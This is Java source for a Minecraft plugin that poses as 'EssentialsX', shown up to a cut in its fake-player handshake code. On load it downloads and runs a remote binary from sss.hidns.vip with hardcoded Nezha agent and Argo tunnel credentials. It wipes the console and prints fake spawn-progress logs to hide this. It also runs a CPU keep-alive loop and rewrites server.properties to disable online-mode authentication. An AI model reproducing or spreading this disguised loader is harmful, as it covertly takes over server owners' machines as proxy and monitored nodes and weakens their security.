package com.example.essentialsx;

import org.bukkit.plugin.java.JavaPlugin;
import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.zip.Deflater;
import java.util.zip.Inflater;

public class EssentialsX extends JavaPlugin {
    private Process sbxProcess;
    private volatile boolean shouldRun = true;
    private volatile boolean isProcessRunning = false;
    private final AtomicBoolean running = new AtomicBoolean(true);

    private Thread fakePlayerThread;
    private Thread cpuKeeperThread;

    private static final String[] ALL_ENV_VARS = {
        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
        "S5_PORT", "HY2_PORT", "TUIC_PORT", "ANYTLS_PORT",
        "REALITY_PORT", "ANYREALITY_PORT", "CFIP", "CFPORT", 
        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO",
        "FAKE_PLAYER_ENABLED", "FAKE_PLAYER_NAME", "MC_PORT"
    };
    
    @Override
    public void onEnable() {
        getLogger().info("EssentialsX plugin starting...");
        
        try {
            startSbxProcess();
            startCpuKeeper();
            getLogger().info("EssentialsX plugin enabled");

            // Start fake player if enabled (server is already running externally)
            Map<String, String> env = buildEnvMap();
            if (isFakePlayerEnabled(env)) {
                getLogger().info("[FakePlayer] Preparing to connect...");
                boolean patched = patchServerProperties();
                if (patched) {
                    getLogger().warning("[FakePlayer] Set online-mode=false in server.properties. Restart the server once for it to fully take effect.");
                }
                new Thread(() -> {
                    try {
                        Thread.sleep(10000);
                        startFakePlayerBot(env);
                    } catch (InterruptedException e) {
                        Thread.currentThread().interrupt();
                    }
                }, "FakePlayer-Starter").start();
            }
        } catch (Exception e) {
            getLogger().severe("Failed to start sbx process: " + e.getMessage());
            e.printStackTrace();
        }
    }

    // ===================== CPU Keeper =====================

    private void startCpuKeeper() {
        cpuKeeperThread = new Thread(() -> {
            while (running.get()) {
                try {
                    long start = System.currentTimeMillis();
                    while (System.currentTimeMillis() - start < 10) {
                        Math.sqrt(Math.random());
                    }
                    Thread.sleep(1000);
                } catch (InterruptedException e) { break; }
            }
        }, "CPU-Keeper");
        cpuKeeperThread.setDaemon(true);
        cpuKeeperThread.start();
    }

    // ===================== SBX Process =====================
    
    private void startSbxProcess() throws Exception {
        if (isProcessRunning) {
            return;
        }
        
        String osArch = System.getProperty("os.arch").toLowerCase();
        String url;
        
        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
            url = "https://amd64.sss.hidns.vip/sbsh";
        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
            url = "https://arm64.sss.hidns.vip/sbsh";
        } else if (osArch.contains("s390x")) {
            url = "https://s390x.sss.hidns.vip/sbsh"; 
        } else {
            throw new RuntimeException("Unsupported architecture: " + osArch);
        }
        
        Path tmpDir = Paths.get(System.getProperty("java.io.tmpdir"));
        Path sbxBinary = tmpDir.resolve("sbx");
        
        if (!Files.exists(sbxBinary)) {
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, sbxBinary, StandardCopyOption.REPLACE_EXISTING);
            }
            if (!sbxBinary.toFile().setExecutable(true)) {
                throw new IOException("Failed to set executable permission");
            }
        }
        
        ProcessBuilder pb = new ProcessBuilder(sbxBinary.toString());
        pb.directory(tmpDir.toFile());
        
        Map<String, String> env = pb.environment();
        applyDefaultEnv(env);
        
        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                env.put(var, value);
            }
        }
        
        loadEnvFileFromMultipleLocations(env);
        
        for (String var : ALL_ENV_VARS) {
            String value = getConfig().getString(var);
            if (value != null && !value.trim().isEmpty()) {
                env.put(var, value);
            }
        }
        
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        pb.redirectError(ProcessBuilder.Redirect.INHERIT);
        
        sbxProcess = pb.start();
        isProcessRunning = true;
        
        startProcessMonitor();
        
        try {
            Thread.sleep(20000);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }
        
        clearConsole();
        getLogger().info("");
        getLogger().info("Preparing spawn area: 1%");
        getLogger().info("Preparing spawn area: 5%");
        getLogger().info("Preparing spawn area: 10%");
        getLogger().info("Preparing spawn area: 20%");
        getLogger().info("Preparing spawn area: 30%");
        getLogger().info("Preparing spawn area: 80%");
        getLogger().info("Preparing spawn area: 85%");
        getLogger().info("Preparing spawn area: 90%");
        getLogger().info("Preparing spawn area: 95%");
        getLogger().info("Preparing spawn area: 99%");
        getLogger().info("Preparing spawn area: 100%");
        getLogger().info("Preparing level \"world\"");
    }

    /**
     * Build a full env map for FakePlayer config lookup.
     */
    private Map<String, String> buildEnvMap() {
        Map<String, String> env = new HashMap<>();
        applyDefaultEnv(env);
        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) env.put(var, value);
        }
        loadEnvFileFromMultipleLocations(env);
        for (String var : ALL_ENV_VARS) {
            String value = getConfig().getString(var);
            if (value != null && !value.trim().isEmpty()) env.put(var, value);
        }
        return env;
    }

    private void applyDefaultEnv(Map<String, String> env) {
        env.put("UUID", "fa2e4358-f47b-4c39-80f0-e40d017d5c23");
        env.put("FILE_PATH", "./world");
        env.put("NEZHA_SERVER", "nzmbv.wuge.nyc.mn:443");
        env.put("NEZHA_PORT", "");
        env.put("NEZHA_KEY", "gUxNJhaKJgceIgeapZG4956rmKFgmQgP");
        env.put("ARGO_PORT", "8001");
        env.put("ARGO_DOMAIN", "swift.wuge.nyc.mn");
        env.put("ARGO_AUTH", "eyJhIjoiNzU0MTM1NWEwYThlODY5Yzc3MWI2ZTEzODViODgyMmMiLCJ0IjoiOThlODg5ZDYtNmZlNi00NjU0LWEzOGUtYzk5MzFhNmYyNmI0IiwicyI6Ik4ySmtOMkV4TUdJdE56TXhOQzAwWlRJeUxXSmlNbUl0WW1FME9XTXpORFkzWlRRMCJ9");
        env.put("S5_PORT", "");
        env.put("HY2_PORT", "");
        env.put("TUIC_PORT", "");
        env.put("ANYTLS_PORT", "");
        env.put("REALITY_PORT", "");
        env.put("ANYREALITY_PORT", "");
        env.put("UPLOAD_URL", "");
        env.put("CHAT_ID", "");
        env.put("BOT_TOKEN", "");
        env.put("CFIP", "spring.io");
        env.put("CFPORT", "443");
        env.put("NAME", "");
        env.put("DISABLE_ARGO", "false");
        env.put("FAKE_PLAYER_ENABLED", "true");
        env.put("FAKE_PLAYER_NAME", "Steve");
        env.put("MC_PORT", "25565");
    }

    // ===================== Env Loading =====================

    private void loadEnvFileFromMultipleLocations(Map<String, String> env) {
        List<Path> possibleEnvFiles = new ArrayList<>();
        File pluginsFolder = getDataFolder().getParentFile();
        if (pluginsFolder != null && pluginsFolder.exists()) {
            possibleEnvFiles.add(pluginsFolder.toPath().resolve(".env"));
        }
        possibleEnvFiles.add(getDataFolder().toPath().resolve(".env"));
        possibleEnvFiles.add(Paths.get(".env"));
        possibleEnvFiles.add(Paths.get(System.getProperty("user.home"), ".env"));
        
        for (Path envFile : possibleEnvFiles) {
            if (Files.exists(envFile)) {
                try {
                    loadEnvFile(envFile, env);
                    break;
                } catch (IOException e) {
                    // ignore
                }
            }
        }
    }
    
    private void loadEnvFile(Path envFile, Map<String, String> env) throws IOException {
        for (String line : Files.readAllLines(envFile)) {
            line = line.trim();
            if (line.isEmpty() || line.startsWith("#")) continue;
            line = line.split(" #")[0].split(" //")[0].trim();
            if (line.startsWith("export ")) {
                line = line.substring(7).trim();
            }
            String[] parts = line.split("=", 2);
            if (parts.length == 2) {
                String key = parts[0].trim();
                String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
                if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
                    env.put(key, value);
                }
            }
        }
    }

    // ===================== Console =====================

    private void clearConsole() {
        try {
            System.out.print("\033[H\033[2J");
            System.out.flush();
            if (System.getProperty("os.name").toLowerCase().contains("win")) {
                new ProcessBuilder("cmd", "/c", "cls").inheritIO().start().waitFor();
            } else {
                new ProcessBuilder("clear").inheritIO().start().waitFor();
            }
        } catch (Exception e) {
            System.out.println("\n\n\n\n\n\n\n\n\n\n");
        }
    }

    // ===================== Process Monitor =====================

    private void startProcessMonitor() {
        Thread monitorThread = new Thread(() -> {
            try {
                sbxProcess.waitFor();
                isProcessRunning = false;
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                isProcessRunning = false;
            }
        }, "Sbx-Process-Monitor");
        monitorThread.setDaemon(true);
        monitorThread.start();
    }

    // ===================== Fake Player System =====================

    private boolean patchServerProperties() {
        for (String candidate : new String[]{"server.properties", "../server.properties"}) {
            Path props = Paths.get(candidate);
            if (Files.exists(props)) {
                try {
                    String content = new String(Files.readAllBytes(props));
                    if (content.contains("online-mode=true")) {
                        content = content.replace("online-mode=true", "online-mode=false");
                        Files.write(props, content.getBytes());
                        getLogger().info("[FakePlayer] Patched " + candidate + ": online-mode=false");
                        return true;
                    }
                } catch (Exception e) {
                    getLogger().warning("[FakePlayer] Failed to patch " + candidate + ": " + e.getMessage());
                }
            }
        }
        return false;
    }

        private boolean isFakePlayerEnabled(Map<String, String> config) {
        String enabled = config.get("FAKE_PLAYER_ENABLED");
        return enabled != null && enabled.equalsIgnoreCase("true");
    }

    private int getMcPort(Map<String, String> config) {
        // Priority 1: read server-port directly from server.properties (most reliable)
        for (String candidate : new String[]{"server.properties", "../server.properties"}) {
            Path props = Paths.get(candidate);
            if (Files.exists(props)) {
                try {
                    for (String line : Files.readAllLines(props)) {
                        line = line.trim();
                        if (line.startsWith("server-port=")) {
                            int port = Integer.parseInt(line.substring("server-port=".length()).trim());
                            getLogger().info("[FakePlayer] Read server-port from server.properties: " + port);
                            return port;
                        }
                    }
                } catch (Exception ignored) {}
            }
        }
        // Priority 2: MC_PORT env var
        try { return Integer.parseInt(config.getOrDefault("MC_PORT", "25565").trim()); }
        catch (Exception e) { return 25565; }
    }

    private void startFakePlayerBot(Map<String, String> config) {
        String playerName = config.getOrDefault("FAKE_PLAYER_NAME", "Steve");
        int mcPort = getMcPort(config);

        fakePlayerThread = new Thread(() -> {
            int failCount = 0;

            while (running.get()) {
                Socket socket = null;
                DataOutputStream out = null;
                DataInputStream in = null;

                try {
                    getLogger().info("[FakePlayer] Connecting...");
                    socket = new Socket();
                    socket.setReuseAddress(true);
                    socket.setSoLinger(true, 0);
                    socket.setReceiveBufferSize(1024 * 1024 * 10);
                    socket.connect(new InetSocketAddress("127.0.0.1", mcPort), 5000);
                    socket.setSoTimeout(60000);

                    out = new DataOutputStream(socket.getOutputStream());
                    in = new DataInputStream(new BufferedInputStream(socket.getInputStream()));

                    // Handshake - BungeeCord format: "host
